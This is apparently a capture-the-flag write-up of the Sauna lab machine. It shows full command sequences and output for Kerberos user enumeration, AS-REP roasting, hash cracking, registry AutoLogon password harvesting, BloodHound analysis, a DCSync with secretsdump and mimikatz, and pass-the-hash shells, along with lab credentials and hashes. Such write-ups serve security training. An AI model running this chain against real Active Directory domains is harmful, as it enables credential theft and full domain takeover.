---
title: 'Sauna: Steaming Credentials — From AS‑REP Roast to DCSync'
published: 2026-05-13
description: ''
image: ''
tags: ['Active Directory']
category: 'Penetration Tester'
draft: false 
lang: ''
---

# Introduction

Sauna is an Easy Windows Active Directory machine that showcases a classic internal penetration test path. Starting from anonymous enumeration, we extract a list of potential employees from the corporate website and validate usernames using Kerberos. An account without pre‑authentication allows an **AS‑REP roast** attack, giving us an initial foothold. 

Privilege escalation begins with a registry misconfiguration that stores **AutoLogon credentials** in plaintext, leading to a lateral move. Finally, BloodHound reveals that the new user holds **DCSync rights**, enabling a full domain compromise and the capture of the Administrator’s hash. The lab emphasizes Kerberos abuse, credential harvesting from the Registry, and the power of Active Directory ACL misconfigurations.

# Reconnaissance

### Nmap Scan

The initial scan reveals a classic Windows Domain Controller with 20 open ports. The output below documents the exact command, open ports, and service versions identified. This information is critical for planning the next enumeration steps.

```bash
nmap -p- --min-rate 10000 10.10.10.170

Nmap scan report for 10.10.10.170
Host is up (0.027s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49681/tcp open  unknown
64471/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 33.29 seconds
```

A targeted scan against the key ports reveals service versions, OS details, and domain information. This targeted scan confirms the presence of Microsoft IIS 10.0, Kerberos, LDAP, and other services typical of a Domain Controller. Notably, the LDAP enumeration script returns the domain name `EGOTISTICAL-BANK.LOCAL`.

```bash
$ nmap -p 53,80,88,135,139,389,445,464,593,3268,3269,5985 -sC -sV -oA scans/tcpscripts 10.10.10.170
Starting Nmap 7.80 ( <https://nmap.org> ) at 2020-02-15 14:20 EST
Nmap scan report for 10.10.10.170
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-16 03:21:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Website - TCP 80

The website depicts "Egotistical Bank" and is mostly static. However, the "About Us" page contains a list of potential employee names. These names are later used to generate possible usernames. The image below shows the exact list of team members extracted from the site.

```
[IMAGE: "About Us" page team list]
  Fergus Smith
  Shaun Coins
  Sophie Driver
  Bowie Taylor
  Hugo Bear
  Steven Kerb
```

Directory brute-forcing with `gobuster` found only standard static directories, yielding no further attack surface.

```bash
$ gobuster dir -u <http://10.10.10.170/> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            <http://10.10.10.170/>
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/15 14:15:03 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/IMAGES (Status: 301)
/Fonts (Status: 301)
/CSS (Status: 301)
===============================================================
2020/02/15 14:22:17 Finished
===============================================================
```

### SMB - TCP 445

Anonymous SMB access is disabled, as shown by the failed `smbmap` and `smbclient` attempts. No shares were accessible without valid credentials.

```bash
$ smbmap -H 10.10.10.170
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.170...
[+] IP: 10.10.10.170:445  Name: 10.10.10.170
    Disk                                                    Permissions     Comment
    ----                                                    -----------     -------
[!] Access Denied
```

```bash
$ smbclient -N -L //10.10.10.170
Anonymous login successful
Sharename       Type      Comment
---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.170]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.170 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

### LDAP - TCP/UDP 389

An LDAP search confirmed the domain naming context `DC=EGOTISTICAL-BANK,DC=LOCAL`. This information is essential for subsequent Kerberos and Active Directory attacks. The image below shows the exact output of the `ldapsearch` command, revealing the domain structure.

```bash
$ ldapsearch -x -h 10.10.10.170 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
```

```bash
$ ldapsearch -x -h 10.10.10.170 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20200216124516.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
...[snip]...
```

### DNS - TCP/UDP 53

Zone transfer attempts against both `sauna.htb` and `egotistical-bank.local` failed, indicating that DNS is not a viable attack vector for initial access.

```bash
$ dig axfr @10.10.10.170 sauna.htb
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.170 sauna.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

```bash
$ dig axfr @10.10.10.170 egotistical-bank.local
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.170 egotistical-bank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### Kerberos - UDP (and TCP) 88

Username enumeration was performed using `kerbrute`. The tool identified four valid usernames: `administrator`, `hsmith`, `fsmith`, and `sauna`. The specific usernames and their case variations are shown in the output below.

```bash
$ kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.170

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\
 / ,< /  __/ /  / /_/ / /  / /_/ / / /  __/
/_/|_|\\___/_/  /_.___/_/   \\__,_/_/  \\___/

Version: dev (n/a) - 02/15/20 - Ronnie Flathers @ropnop

2020/02/15 14:41:50 > Using KDC(s):
2020/02/15 14:41:50 >  10.10.10.170:88

2020/02/15 14:41:59 > [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:46 > [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:54 > [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:43:21 > [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:47:43 > [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 16:01:56 > [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 > [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 > [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:24:34 > Done! Tested 8295455 usernames (8 valid) in 17038.364 seconds
```

A custom list based on the "About Us" page names was created to confirm that no additional users exist. The naming format `[first initial][lastname]` was used, but only the already identified users were found.

```
fsmith
scoins
sdriver
btayload
hbear
skerb
```

## Shell as fsmith

### AS-REP Roasting

The Impacket script `GetNPUsers.py` was used to check the enumerated users for the `UF_DONT_REQUIRE_PREAUTH` flag. This flag allows an attacker to request a TGT for the user without prior authentication, making them vulnerable to AS-REP roasting. The user `fsmith` was found to have this flag set, and the script successfully extracted an AS-REP hash. The exact hash is provided in the output below, which can be used for offline cracking.

```bash
$ GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.170
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set

$ cat hashes.aspreroast
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a89b6e78741dfb23312bc04c1892e558$a9aff5e5a5080949e6e4f4bbd690230277b586e7717b3328a80b636872f77b9deb765e5e6fab3c51b4414452bc4d4ad4a1705b2c5c42ea584bfe170fa8f54a89a095c3829e489609d74fd10a124dbf8445a1de2ed213f4682a679ab654d0344ff869b959c79677790e99268944acd41c628e70491487ffb6bcef332b74706ccecf70f64af110897b852d3a8e7b3e55c740c879669481115685915ec251e0316b682a5ca1c77b5294efae72d3642117d84429269f5eaea23c3b01b6beaf59c63ffaf5994e180e467de8675928929b754db7fc8c7e773da473649af149def29e5ffb5f94b5cb7912b68ccbee741b6e205ce8388d973b9b59cf7c8606de4bb149c0
```

### Hash Cracking

The hash was cracked using `hashcat` with the `rockyou.txt` wordlist. Mode `-m 18200` corresponds to Kerberos 5 AS-REP etype 23. The cracked password is `Thestrokes23`.

```bash
$ hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...
...[snip]...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a89b6e78741dfb23312bc04c1892e558$a9aff5e5a5080949e6e4f4bbd690230277b586e7717b3328a80b636872f77b9deb765e5e6fab3c51b4414452bc4d4ad4a1705b2c5c42ea584bfe170fa8f54a89a095c3829e489609d74fd10a124dbf8445a1de2ed213f4682a679ab654d0344ff869b959c79677790e99268944acd41c628e70491487ffb6bcef332b74706ccecf70f64af110897b852d3a8e7b3e55c740c879669481115685915ec251e0316b682a5ca1c77b5294efae72d3642117d84429269f5eaea23c3b01b6beaf59c63ffaf5994e180e467de8675928929b754db7fc8c7e773da473649af149def29e5ffb5f94b5cb7912b68ccbee741b6e205ce8388d973b9b59cf7c8606de4bb149c0:Thestrokes23
...[snip]...
```

### Evil-WinRM

Using the cracked credentials, a remote PowerShell session was established via WinRM (port 5985). The `evil-winrm` tool was used to connect. The user `fsmith` is now authenticated, and the `user.txt` flag is retrieved from the desktop.

```bash
$ evil-winrm -i 10.10.10.170 -u fsmith -p Thestrokes23
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\FSmith\\Documents>
```

```bash
*Evil-WinRM* PS C:\\Users\\FSmith\\desktop> type user.txt
1b5520b9************************
```

## Privilege Escalation: fsmith → svc_loanmgr

### Enumeration with WinPEAS

`winPEAS.exe` was uploaded and executed to search for privilege escalation vectors. The full output was analyzed, and the following AutoLogon credentials were discovered. A screenshot of the WinPEAS output highlighting the AutoLogon section would appear as follows:

```
[IMAGE: WinPEAS output showing AutoLogon credentials]
  [+] Looking for AutoLogon credentials (T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName : EGOTISTICALBANK
    DefaultUserName : EGOTISTICALBANK\\svc_loanmanager
    DefaultPassword : Moneymakestheworldgoround!
```

These credentials are stored in the registry and can also be viewed manually via PowerShell. The registry key `HKLM:\\software\\microsoft\\windows nt\\currentversion\\winlogon` reveals the username and password directly. The image of the registry query output would show the exact values as retrieved.

```powershell
*Evil-WinRM* PS HKLM:\\software\\microsoft\\windows nt\\currentversion\\winlogon> get-item -path .
Hive: HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion

Name                           Property
----                           --------
winlogon                       AutoRestartShell            : 1
                               Background                  : 0 0 0
                               CachedLogonsCount           : 10
                               DebugServerCommand          : no
                               DefaultDomainName           : EGOTISTICALBANK
                               DefaultUserName             : EGOTISTICALBANK\\svc_loanmanager   <-- username
                               DisableBackButton           : 1
                               EnableSIHostIntegration     : 1
                               ForceUnlockLogon            : 0
                               LegalNoticeCaption          :
                               LegalNoticeText             :
                               PasswordExpiryWarning       : 5
                               PowerdownAfterShutdown      : 0
                               PreCreateKnownFolders       : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
                               ReportBootOk                : 1
                               Shell                       : explorer.exe
                               ShellCritical               : 0
                               ShellInfrastructure         : sihost.exe
                               SiHostCritical              : 0
                               SiHostReadyTimeOut          : 0
                               SiHostRestartCountLimit     : 0
                               SiHostRestartTimeGap        : 0
                               Userinit                    : C:\\Windows\\system32\\userinit.exe,
                               VMApplet                    : SystemPropertiesPerformance.exe /pagefile
                               WinStationsDisabled         : 0
                               scremoveoption              : 0
                               DisableCAD                  : 1
                               LastLogOffEndTimePerfCounter : 808884164
                               ShutdownFlags               : 19
                               DisableLockWorkstation       : 0
                               DefaultPassword             : Moneymakestheworldgoround!   <-- password
```

### Evil-WinRM as svc_loanmgr

The discovered password successfully authenticates the account `svc_loanmgr` (note the slightly different username compared to the registry value). A new Evil-WinRM session as `svc_loanmgr` is established.

```bash
$ evil-winrm -i 10.10.10.170 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
Evil-WinRM shell v2.1
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents>
```

## Privilege Escalation: svc_loanmgr → root

### BloodHound Analysis

BloodHound was used to analyze Active Directory relationships. The SharpHound collector was run on the target to gather data. The resulting zip file is imported into the BloodHound GUI.

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\\FileSystem::\\\\10.10.14.30\\share> .\\SharpHound.exe
```

```
Initializing SharpHound at 6:36 PM on 2/16/2020
Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
[+] Creating Schema map for domain EGOTISTICAL-BANK.LOCAL using path CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache
[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 60 objects finished (+60 30)/s -- Using 26 MB RAM
Enumeration finished in 00:00:02.1309648
Compressing data to .\\20200216183650_BloodHound.zip
You can upload this file directly to the UI
SharpHound Enumeration Completed at 6:36 PM on 2/16/2020! Happy Graphing!
```

Upon searching for the user `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL` in BloodHound, an outbound object control edge is revealed. The user has `GetChanges` and `GetChangesAll` privileges on the domain, which are the exact rights needed to perform a DCSync attack. A screenshot of the BloodHound graph highlighting this privilege would show the path from the user to the domain.

```
[IMAGE: BloodHound graph showing SVC_LOANMGR user with "DC Sync" edge to the domain]
  - User: SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL
  - Privilege: GetChanges, GetChangesAll on EGOTISTICAL-BANK.LOCAL
  - Abuse Info: This user can perform a DCSync attack to replicate domain credentials.
```

BloodHound's built-in "Abuse Info" feature provides guidance on exploiting this privilege, recommending the use of `secretsdump.py` or Mimikatz to perform the DCSync.

### DCSync Attack via [secretsdump.py](http://secretsdump.py/)

The Impacket tool `secretsdump.py` executed the DCSync attack remotely, dumping all domain hashes. The output includes the NTLM hash of the Administrator account (`d9485863c1e9e05851aa40cbb4ab9dff`) and the Kerberos keys.

```bash
$ secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.170'
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
...[snip]...
[*] Cleaning up...
```

An alternative method using Mimikatz on the target also successfully extracted the NT hash for the Administrator. The specific Mimikatz command and the output showing the NTLM hash are provided below.

```bash
*Evil-WinRM* PS C:\\programdata> .\\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \\ / ##       > <http://blog.gentilkiwi.com/mimikatz>
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > <http://pingcastle.com> / <http://mysmartlogon.com>   ***/

mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'administrator' will be the user account

Object RDN              : Administrator

** SAM ACCOUNT **
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211
...[snip]...
```

### Post-Exploitation Shells

With the Administrator hash, several tools can be used to spawn a SYSTEM-level shell. Two options are demonstrated:

**Option 1: WMIExec**

```bash
$ wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.170 administrator@10.10.10.170
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>whoami
egotisticalbank\\administrator
```

**Option 2: PSExec**

```bash
$ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.170 administrator@10.10.10.170
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
[*] Requesting shares on 10.10.10.170.....
[*] Found writable share ADMIN$
[*] Uploading file TQeVYGvK.exe
[*] Opening SVCManager on 10.10.10.170.....
[*] Creating service bEUo on 10.10.10.170.....
[*] Starting service bEUo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\\Windows\\system32>whoami
nt authority\\system
```

**Option 3: Evil-WinRM with Hash**

```bash
$ evil-winrm -i 10.10.10.170 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
```

Finally, the `root.txt` flag is captured:

```bash
C:\\users\\administrator\\desktop>type root.txt
f3ee0496************************
```

# Attack Path Summary

| **Step** | **Action** | **Tool** | **Result** |
| --- | --- | --- | --- |
| 1 | Port scanning | nmap | Identified open ports and services |
| 2 | Website enumeration | Browser | Discovered list of employees |
| 3 | Username enumeration | kerbrute | Identified valid domain users |
| 4 | AS-REP roasting | [GetNPUsers.py](http://getnpusers.py/) | Extracted hash for fsmith |
| 5 | Hash cracking | hashcat | Cracked password: `Thestrokes23` |
| 6 | Initial access | evil-winrm | Shell as fsmith |
| 7 | Privilege escalation enumeration | winPEAS | Found AutoLogon credentials for svc_loanmgr |
| 8 | Lateral movement | evil-winrm | Shell as svc_loanmgr |
| 9 | Active Directory enumeration | SharpHound/BloodHound | Discovered DC Sync rights for svc_loanmgr |
| 10 | DCSync attack | [secretsdump.py](http://secretsdump.py/) | Dumped all domain hashes |
| 11 | Pass-the-hash | [wmiexec.py](http://wmiexec.py/) / [psexec.py](http://psexec.py/) | Shell as SYSTEM |
| 12 | Flag retrieval | - | Captured root.txt |

### Key Takeaways

- **Kerberos enumeration** is a powerful technique for identifying valid usernames without authentication.
- **AS-REP roasting** exploits accounts that do not require Kerberos pre-authentication, allowing offline password cracking.
- **AutoLogon credentials** stored in the registry are a common misconfiguration that can lead to privilege escalation.
- **BloodHound** visually maps Active Directory relationships, making it easy to identify attack paths such as DCSync.
- **DCSync attacks** can be performed remotely using `secretsdump.py` if a user has the `GetChanges` and `GetChangesAll` privileges.
- Always check for writable SMB shares and other lateral movement opportunities after gaining initial foothold.

This box provides a solid introduction to Active Directory enumeration and exploitation techniques commonly used in penetration testing and red team engagements.